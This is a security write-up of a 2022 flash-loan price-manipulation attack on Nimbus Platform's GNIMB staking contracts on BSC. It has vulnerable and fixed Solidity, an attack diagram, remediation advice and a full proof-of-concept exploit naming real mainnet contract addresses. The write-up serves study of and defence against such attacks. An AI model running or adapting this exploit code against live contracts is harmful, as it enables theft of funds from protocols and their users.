# Nmbplatform — getReward() Staking Reward Price Manipulation Attack Analysis

| Item | Details |
|------|------|
| **Date** | 2022-12 |
| **Protocol** | Nimbus Platform (GNIMB) |
| **Chain** | Binance Smart Chain (BSC) |
| **Loss** | Unconfirmed |
| **GNIMB Token** | [0x99C486b908434Ae4adF567e9990A929854d0c955](https://bscscan.com/address/0x99C486b908434Ae4adF567e9990A929854d0c955) |
| **NIMB Token** | [0xCb492C701F7fe71bC9C4B703b84B0Da933fF26bB](https://bscscan.com/address/0xCb492C701F7fe71bC9C4B703b84B0Da933fF26bB) |
| **WBNB** | [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c](https://bscscan.com/address/0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c) |
| **NBU/WBNB Pair** | [0xA2CA18FC541B7B101c64E64bBc2834B05066248b](https://bscscan.com/address/0xA2CA18FC541B7B101c64E64bBc2834B05066248b) |
| **NimbusRouter** | [0x2C6cF65f3cD32a9Be1822855AbF2321F6F8f6b24](https://bscscan.com/address/0x2C6cF65f3cD32a9Be1822855AbF2321F6F8f6b24) |
| **StakingReward1** | [0x3aA2B9de4ce397d93E11699C3f07B769b210bBD5](https://bscscan.com/address/0x3aA2B9de4ce397d93E11699C3f07B769b210bBD5) |
| **StakingReward2** | [0x706065716569f20971F9CF8c66D092824c284584](https://bscscan.com/address/0x706065716569f20971F9CF8c66D092824c284584) |
| **StakingReward3** | [0xdEF57A7722D4411726ff40700Eb7b6876BEE7ECB](https://bscscan.com/address/0xdEF57A7722D4411726ff40700Eb7b6876BEE7ECB) |
| **DODO Flash Loan** | [0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4](https://bscscan.com/address/0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4) |
| **Root Cause** | `StakingRewardFixedAPY.getReward()` reward calculation directly depends on the AMM spot price via `NimbusRouter.getPrice()`, allowing arbitrary reward amplification through single-block price manipulation (no TWAP/external oracle used) |
| **CWE** | CWE-840: Business Logic Errors |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-12/Nmbplatform_exp.sol) |

---
## 1. Vulnerability Overview

Nimbus Platform's `StakingRewardFixedAPY` contract paid fixed APY rewards pegged to the NIMB token price when users staked GNIMB tokens. The `getReward()` function used the current NIMB/WBNB spot price when calculating the reward GNIMB amount. The attacker flash-borrowed the entire WBNB balance from DODO, executed a Uniswap swap on the NBU/WBNB pair to artificially inflate the NIMB price, then called `getReward()` on three staking contracts to receive excess GNIMB based on the inflated price. The attacker subsequently arbitraged GNIMB into NIMB, converted back to WBNB, and repaid the flash loan.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable StakingRewardFixedAPY - reward calculation based on spot price
contract StakingRewardFixedAPY {
    INimbusRouter public router;

    // ❌ AMM spot price used in reward calculation
    function earned(address account) public view returns (uint256) {
        uint256 stakedAmount = balanceOf(account);
        uint256 stakingDuration = block.timestamp - lastUpdateTime[account];

        // ❌ Reward amount calculated using current NIMB spot price
        // earned() value spikes when price is manipulated via flash loan
        uint256 nimbPrice = router.getPrice(address(NIMB), address(WBNB));
        uint256 reward = stakedAmount * APY * stakingDuration * nimbPrice / (365 days * 1e18);
        return reward;
    }

    // ❌ getReward pays out earned() directly
    function getReward() external {
        uint256 reward = earned(msg.sender);
        rewards[msg.sender] = 0;
        GNIMB.transfer(msg.sender, reward);  // ❌ Excess payout based on manipulated price
    }
}

// ✅ Correct pattern - use TWAP or Chainlink oracle
contract SafeStakingReward {
    AggregatorV3Interface public priceOracle; // Chainlink

    function earned(address account) public view returns (uint256) {
        uint256 stakedAmount = balanceOf(account);
        uint256 stakingDuration = block.timestamp - lastUpdateTime[account];

        // ✅ Manipulation-resistant external oracle price
        (, int256 price,,,) = priceOracle.latestRoundData();
        uint256 nimbPrice = uint256(price);
        uint256 reward = stakedAmount * APY * stakingDuration * nimbPrice / (365 days * 1e8);
        return reward;
    }
}
```

---
### On-Chain Original Code

Source: Bytecode decompiled


**Nmbplatform_decompiled.sol** — entry point:
```solidity
// ❌ Root cause: `StakingRewardFixedAPY.getReward()` reward calculation directly depends on AMM spot price via `NimbusRouter.getPrice()`, allowing arbitrary reward amplification within a single block
    function transferFrom(address arg0, address arg1, uint256 arg2) external {}  // 0x23b872dd  // ❌ Unauthorized transferFrom
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker (3 user contracts pre-deployed, GNIMB staked)
    │
    ├─[1] Flash borrow entire WBNB balance from DODO
    │
    ├─[2] Execute swap on NBU/WBNB pair
    │       WBNB → NBU (or NIMB-related token)
    │       NIMB price artificially inflated
    │
    ├─[3] Convert WBNB → NBU_WBNB → NIMB
    │       Acquire NIMB tokens
    │
    ├─[4] Inject NIMB liquidity to complete price manipulation
    │       NimbusRouter.getPrice(NIMB, WBNB) spikes
    │
    ├─[5] Call StakingReward1.getReward()
    │       ❌ Receive excess GNIMB based on manipulated NIMB spot price
    │
    ├─[6] Call StakingReward2.getReward()
    │       ❌ Receive additional GNIMB at same manipulated price
    │
    ├─[7] Call StakingReward3.getReward()
    │       ❌ Third excess reward
    │
    ├─[8] Arbitrage GNIMB → NIMB
    │
    ├─[9] Convert back NIMB → NBU_WBNB → WBNB
    │
    ├─[10] Repay DODO flash loan
    │
    └─[11] Net profit: WBNB spread
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IStakingRewardFixedAPY {
    function stake(uint256 amount) external;
    function getReward() external;
    function withdraw(uint256 amount) external;
    function earned(address account) external view returns (uint256);
}

interface INimbusBNB {
    function deposit() external payable;
    function withdraw(uint256) external;
}

interface INimbusRouter {
    function swapExactTokensForTokens(
        uint256, uint256, address[] calldata, address, uint256
    ) external returns (uint256[] memory);
}

interface IDODO {
    function flashLoan(uint256, uint256, address, bytes calldata) external;
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

// Pre-deployed staking user contract
contract StakeUser {
    IStakingRewardFixedAPY public staking;
    IERC20 public gnimb;
    address public owner;

    constructor(address _staking, address _gnimb) {
        staking = IStakingRewardFixedAPY(_staking);
        gnimb = IERC20(_gnimb);
        owner = msg.sender;
    }

    function stakeAll() external {
        require(msg.sender == owner);
        gnimb.approve(address(staking), type(uint256).max);
        staking.stake(gnimb.balanceOf(address(this)));
    }

    function claimAndReturn() external {
        require(msg.sender == owner);
        staking.getReward();
        gnimb.transfer(owner, gnimb.balanceOf(address(this)));
    }
}

contract NmbplatformExploit is Test {
    IERC20       GNIMB    = IERC20(0x99C486b908434Ae4adF567e9990A929854d0c955);
    IERC20       NIMB     = IERC20(0xCb492C701F7fe71bC9C4B703b84B0Da933fF26bB);
    IERC20       WBNB     = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IDODO        dodo     = IDODO(0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4);
    INimbusRouter router  = INimbusRouter(0x2C6cF65f3cD32a9Be1822855AbF2321F6F8f6b24);

    StakeUser[3] users;

    IStakingRewardFixedAPY[3] stakings = [
        IStakingRewardFixedAPY(0x3aA2B9de4ce397d93E11699C3f07B769b210bBD5),
        IStakingRewardFixedAPY(0x706065716569f20971F9CF8c66D092824c284584),
        IStakingRewardFixedAPY(0xdEF57A7722D4411726ff40700Eb7b6876BEE7ECB)
    ];

    function setUp() public {
        vm.createSelectFork("bsc");

        // Deploy pre-staking user contracts and stake GNIMB
        for (uint256 i = 0; i < 3; i++) {
            users[i] = new StakeUser(address(stakings[i]), address(GNIMB));
            // Transfer some GNIMB and stake
            GNIMB.transfer(address(users[i]), /* initial GNIMB */0);
            users[i].stakeAll();
        }
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] WBNB", WBNB.balanceOf(address(this)), 18);
        // [Step 1] Flash borrow entire WBNB from DODO
        dodo.flashLoan(WBNB.balanceOf(address(dodo)), 0, address(this), "");
        emit log_named_decimal_uint("[End] WBNB", WBNB.balanceOf(address(this)), 18);
    }

    function DPPFlashLoanCall(address, uint256 amount, uint256, bytes calldata) external {
        // [Steps 2-4] Manipulate price by converting WBNB → NBU/NIMB
        WBNB.approve(address(router), type(uint256).max);
        address[] memory path = new address[](3);
        path[0] = address(WBNB);
        path[1] = 0xA2CA18FC541B7B101c64E64bBc2834B05066248b; // NBU_WBNB
        path[2] = address(NIMB);
        router.swapExactTokensForTokens(amount / 2, 0, path, address(this), block.timestamp);

        // [Steps 5-7] Call getReward() on 3 staking contracts
        // ⚡ Receive excess GNIMB based on manipulated NIMB spot price
        for (uint256 i = 0; i < 3; i++) {
            users[i].claimAndReturn();
        }

        // [Steps 8-9] Convert back GNIMB → NIMB → WBNB
        GNIMB.approve(address(router), type(uint256).max);
        path[0] = address(GNIMB); path[1] = address(NIMB); path[2] = address(WBNB);
        router.swapExactTokensForTokens(
            GNIMB.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );

        // Repay flash loan
        WBNB.transfer(address(dodo), amount);
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | AMM spot price dependency in `getReward()` reward calculation |
| **CWE** | CWE-840: Business Logic Errors |
| **OWASP DeFi** | Price Oracle Manipulation |
| **Attack Vector** | DODO WBNB flash loan → WBNB→NIMB price manipulation → `getReward()` × 3 → GNIMB→WBNB conversion |
| **Preconditions** | `getReward()` rewards based on NimbusRouter spot price, pre-existing staked position required |
| **Impact** | WBNB profit (scale unconfirmed) |

---
## 6. Remediation Recommendations

1. **Use Chainlink Oracle**: Use a trusted external price feed such as Chainlink instead of AMM spot prices for reward calculations.
2. **TWAP-Based Pricing**: If Chainlink is unavailable, use a TWAP of 30 minutes or more to prevent single-block price manipulation.
3. **Reward Cap**: Set an upper limit on the maximum reward claimable in a single transaction.
4. **Reward Claim Cooldown**: Require a minimum waiting period between consecutive reward claims.

---
## 7. Lessons Learned

- **Fixed APY combined with spot price**: Even fixed APY staking is vulnerable to price manipulation if a spot price is used to calculate the reward token amount. This vulnerability arises when "Fixed APY" is denominated in dollar terms rather than token quantity terms.
- **Simultaneous attack on multiple staking contracts**: Three staking contracts were attacked simultaneously within the same flash loan. When multiple contracts within the same protocol share the same price oracle, a single manipulation affects all of them.
- **Pre-staking required attack**: This attack required GNIMB to be staked in advance. Even when a flash loan alone cannot execute an immediate attack, a pattern exists where a small pre-positioned stake yields significantly larger gains.